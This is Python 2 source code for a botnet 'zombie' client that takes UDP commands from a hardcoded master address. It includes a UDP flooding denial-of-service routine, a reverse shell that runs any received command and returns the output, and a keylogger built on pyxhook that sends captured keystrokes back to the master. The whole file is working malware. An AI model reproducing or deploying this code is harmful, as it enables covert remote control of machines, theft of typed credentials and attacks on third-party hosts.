import sys
import socket
import subprocess
import pyxhook
import time


MASTER_IP = "127.0.0.1"
MASTER_PORT = 6000
ZOMB_PORT = int(sys.argv[1])


log_file='/home/aman/Desktop/file.log'
keys = ""
last_key = ''

#this function is called everytime a key is pressed.
def OnKeyPress(event):
	global keys
	global last_key
	keys += event.Key
	keys += " "
	last_key = event.Key


class Zombie:

	def __init__(self,conn):
		self.conn = conn


	#Denial of Service Attack
	def dos(self,dest_ip,dest_port):

		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)		#Create socket
			print "dos connected..."
		except socket.error, msg :
			print 'Failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
			return

		print "starting dos..."
		for i in xrange(10):
			sock.sendto("ZOMB-("+MASTER_IP+","+str(ZOMB_PORT)+")",(dest_ip,dest_port))						#Send packets

		sock.sendto("dos finished...",(MASTER_IP,MASTER_PORT)) 
		sock.close()													#Close socket

	#Reverse Shell
	def reverse_shell(self):

		print "Starting reverse shell...\n"

		while True:
			cmd = self.conn.recv(1024)				#Receive shell command
			print cmd
			if cmd == 'exit':					#Break if user wished to exit
				print "Exiting...\n"
				break

			# do shell command
			new_process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			# read output
			stdout_value = new_process.stdout.read() + new_process.stderr.read()
			# send back output
			self.conn.sendto(stdout_value,(MASTER_IP,MASTER_PORT))

	#Keylog for a time period and send data back to master
	def keylog(self,t):
		global keys
		global last_key
		keys = ""
		last_key = ''


		print "initializing keyboard hook..."
		#instantiate HookManager class
		hook=pyxhook.HookManager()
		#listen to all keystrokes
		hook.KeyDown=OnKeyPress
		#hook the keyboard
		hook.HookKeyboard()
		#start the session
		hook.start()

		print "starting key logging..."
		start = time.time()
		while time.time() - start < t:
			if last_key=="grave": #the grave key (`)
				break
		hook.cancel()
		print "stopped key logging..."
		keys = keys + "`127.0.0.1`" + str(ZOMB_PORT) 				#hard coded ip and port

		print "sending key data..."
		self.conn.sendto(keys,(MASTER_IP,MASTER_PORT))

	#Parse masters command
	def parse_cmd(self,p):
		# packet = conn.recv(1024)
		packet = p.split(',')

		#packet = "DDOS,DEST_IP,DEST_PORT"
		if packet[0] == "DDOS":
			self.dos(packet[1],int(packet[2]))

		#packet = "KEYL,TIME"
		#TIME is in seconds
		elif packet[0] == "KEYL":
			self.keylog(int(packet[1]))

		#packet = "RVSH"
		elif packet[0] == "RVSH":
			self.conn.sendto("RVSH",(MASTER_IP,MASTER_PORT))				#Tell master to start sending commands
			self.reverse_shell()





if __name__ == '__main__':


	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)		#Create socket
		s.bind(('',ZOMB_PORT))								#Bind to port
		print 'Socket created'
	except socket.error, msg :
		print 'Failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
		sys.exit()

	
	zomb = Zombie(s)

	while True:
		print "\nwaiting for commands..."
		#Receive command
		data, addr = zomb.conn.recvfrom(1024)
		print "reveived: " + data + " from: " + addr[0] + " " + str(addr[1])
		if addr[0] == MASTER_IP:
			print "Parsing..."
			zomb.parse_cmd(data)


	zomb.conn.close()
